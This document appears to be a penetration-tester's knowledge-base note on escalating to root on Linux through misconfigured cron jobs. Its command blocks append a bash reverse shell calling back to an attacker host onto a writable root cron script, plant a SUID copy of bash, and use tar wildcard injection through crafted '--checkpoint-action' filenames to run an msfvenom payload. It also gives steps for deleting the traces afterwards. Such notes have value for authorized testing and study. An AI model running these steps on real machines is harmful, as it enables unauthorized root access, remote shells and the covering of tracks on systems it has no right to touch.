# Living off the Land

## 01 - File Permissions

After performing the Enumeration and Discovery phase for [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Linux/Host/0xC - Scheduled Tasks/Cron Job/Manual/Living off the Land|Cron Jobs]] and [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Linux/Host/0xE - Files and Directories/Manual/Living off the Land|Writable Folders]].

```
$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
$ echo "bash -i >& /dev/tcp/<attacker_ip>/<LPORT> 0>&1" >> /usr/local/bin/overwrite.sh
```

You can find more [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Linux/Code Execution/One-Liners/Reverse Shells/Bash|bash one-liners]] regarding with this section.

## 02 - PATH Environment Variable

Another way we can utilize this vulnerability is way using the same privilege escalation technique for [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x02 - Privilege Escalation/Linux/Local Privilege Escalation/SUID and SGID/README|README]]. We create a new shell script to copy the `/bin/bash` binary and change file permissions with a sticky-bit SUID and SGID.

```
$ cp /usr/local/bin/overwrite.sh /tmp/overwrite.sh.bak
$ cat overwrite.sh
#!/bin/bash  
  
cp /bin/bash /tmp/cronjob  
chmod +xs /tmp/cronjob
$ chmod +x overwrite.sh
$ ls -lah /tmp/cronjob
-rwsr-sr-x 1 root root 905K Jan 19 15:28 /tmp/cronjob
$ /tmp/cronjob -p
cronjob-4.1# whoami
root
cronjob-4.1# exit
exit
```

## 03 - Wildcards

### 3.1 - Enumerate

One of the few mistakes due to negligence for not taking into account when backing things up with root privileges.

```
$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

Notice the wildcard that runs with a character `*` in the home directory. If we search about the **GTFOBins** website to exploit the `sudo` privileges for the archiving program called [tar](https://gtfobins.github.io/gtfobins/tar/).

### 3.2 - Exploit

Generate a payload with `msfvenom` then transfer the payload to the compromised machine and look more into **File Transfers and Data Exfiltration** section.

```
$ chmod +x $HOME/shell.elf
$ touch $HOME/--checkpoint=1
$ touch $HOME/--checkpoint-action=exec=shell.elf
$ ls -lh
total 0
-rw-r--r-- 1 user user    0 Jan 19 15:46 --checkpoint=1
-rw-r--r-- 1 user user    0 Jan 19 15:46 --checkpoint-action=exec=shell.elf
```

Another way to create files by escaping it. This way is much easier.

```
$ touch -- --checkpoint=1
$ touch -- --checkpoint-action=exec=shell.elf
```

### 3.3 - Cleanup

Launch a reverse shell handler like netcat, msfconsole or any handler of your choosing. Once you've received a connection. Cleanup the trace you've left.

```
$ rm $HOME/shell.elf
$ rm $HOME/--checkpoint=1
$ rm $HOME/--checkpoint-action\=exec\=shell.elf
```

Another way to delete the files. And this is much easier.

```
$ rm -- --checkpoint=1
$ rm -- --checkpoint-action=exec=shell.elf
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Linux/Host/0xC - Scheduled Tasks/Cron Job/Manual/Living off the Land]]

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x07 - Maintaining Access/Persistence/Linux/Backdoors/Scheduled Tasks/Manual/Living off the Land]]

### Hacking Articles

- [Linux Privilege Escalation by Exploiting Cron Jobs](https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/)